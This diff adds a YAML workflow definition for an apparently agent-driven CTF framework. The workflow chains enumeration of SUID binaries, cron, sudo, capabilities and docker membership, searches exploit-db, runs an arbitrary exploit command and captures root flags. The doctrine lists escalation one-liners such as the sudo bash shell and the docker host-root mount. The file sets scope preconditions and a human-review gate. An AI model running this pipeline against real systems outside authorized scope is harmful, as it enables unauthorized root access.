@@ -1,0 +1,161 @@
+author: hermes
+created: '2026-05-05T21:55:00-04:00'
+description: >
+  Privilege escalation molecule — post-exploitation enumeration to find
+  paths to root/admin access. Chains post-exploit recon → CVE matching →
+  exploit selection → privilege escalation → flag capture.
+id: ctf.priv_esc
+kind: molecule
+tier: global
+version: 1
+
+implementation:
+  kind: compose
+  dag:
+    post_exploit:
+      atom: post.exploit.recon
+      inputs:
+        target: '{{inputs.target}}'
+    priv_check:
+      atom: shell.run
+      inputs:
+        command: |
+          # Linux privilege escalation check
+          # 1. Kernel version
+          uname -r
+          # 2. SUID binaries
+          find / -perm -4000 -type f 2>/dev/null
+          # 3. SGID binaries
+          find / -perm -2000 -type f 2>/dev/null
+          # 4. Writable files in /etc
+          find /etc -writable -type f 2>/dev/null | head -20
+          # 5. Cron jobs
+          crontab -l 2>&1
+          ls -la /etc/cron* 2>/dev/null
+          cat /etc/crontab 2>/dev/null
+          # 6. Sudo rights
+          sudo -l 2>&1
+          # 7. Capabilities
+          getcap -r / 2>/dev/null
+          # 8. Docker group membership
+          groups
+          # 9. Recent file modifications
+          find / -mtime -1 -type f 2>/dev/null | grep -v proc | head -30
+          # 10. Environment variables
+          env
+    exploit_match:
+      atom: exploit.db.search
+      inputs:
+        search_term: '{{inputs.exploit_search_term}}'
+      depends_on:
+        - post_exploit
+      condition: 'exploit.search_term is set'
+    exploit_execute:
+      atom: shell.run
+      inputs:
+        command: '{{inputs.exploit_command}}'
+      depends_on:
+        - priv_check
+    flag_capture:
+      atom: shell.run
+      inputs:
+        command: 'cat /root/root.txt 2>/dev/null; find / -name "*flag*" -type f 2>/dev/null'
+      depends_on:
+        - exploit_execute
+    record_results:
+      atom: mem.write_session
+      inputs:
+        path: '{{session}}/findings/ctf_priv_esc.json'
+        data:
+          molecule: ctf.priv_esc
+          target: '{{inputs.target}}'
+          post_exploit_findings: '{{steps.post_exploit.result}}'
+          privesc_method: '{{inputs.exploit_search_term}}'
+      depends_on:
+        - flag_capture
+
+inputs:
+  target:
+    required: true
+    type: string
+    description: "Target host (local or remote via SSH)"
+  exploit_search_term:
+    required: false
+    type: string
+    description: "CVE or vulnerability to search for (e.g., 'CVE-2021-3156')"
+  exploit_command:
+    required: false
+    type: string
+    description: "Custom exploit command"
+
+outputs:
+  type: ctf.priv_esc.v1
+
+doctrine:
+  purpose: >
+    Automated privilege escalation after initial foothold.
+    Enumerates the system for common privesc vectors:
+    SUID binaries, kernel exploits, cron misconfigurations,
+    sudo abuse, Docker access, and capabilities.
+  
+  privesc_vector_order:
+    - priority: 1
+      name: sudo abuse
+      description: >
+        If user has NOPASSWD sudo access to a writable binary,
+        escalate immediately via: sudo /bin/bash
+    - priority: 2
+      name: SUID/SGID
+      description: >
+        Check for known exploit SUID binaries (GTFOBins).
+        Run: find / -perm -4000 -type f -exec file {} \;
+    - priority: 3
+      name: cron jobs
+      description: >
+        Writable cron scripts or cron as root user.
+        Check: ls -la /etc/cron*, crontab -l
+    - priority: 4
+      name: kernel exploits
+      description: >
+        Match kernel version against known exploits (searchsploit).
+    - priority: 5
+      name: Docker
+      description: >
+        If user is in docker group, mount host rootfs:
+        docker run -v /:/host -it alpine chroot /host
+    - priority: 6
+      name: capabilities
+      description: >
+        Check for capabilities on binaries (getcap -r /).
+        Capabilities can grant root-equivalent access.
+
+  safety_gates:
+    - gate: no_system_destruction
+      description: >
+        Do not run destructive exploits without operator approval.
+      apply_to: exploit_execute
+
+prerequisites:
+  - post.exploit.recon
+  - exploit.db.search
+  - shell.run
+  - mem.write_session
+
+preconditions:
+  - scope.includes(inputs.target)
+
+promotion:
+  required_distinct_inputs: 3
+  required_success: 3
+  requires_human_review: true
+
+reversible: true
+risk: medium
+side_effects:
+  - system_change
+  - privilege_escalation
+tier: global
+trials:
+  failure: 0
+  last_run: null
+  success: 0
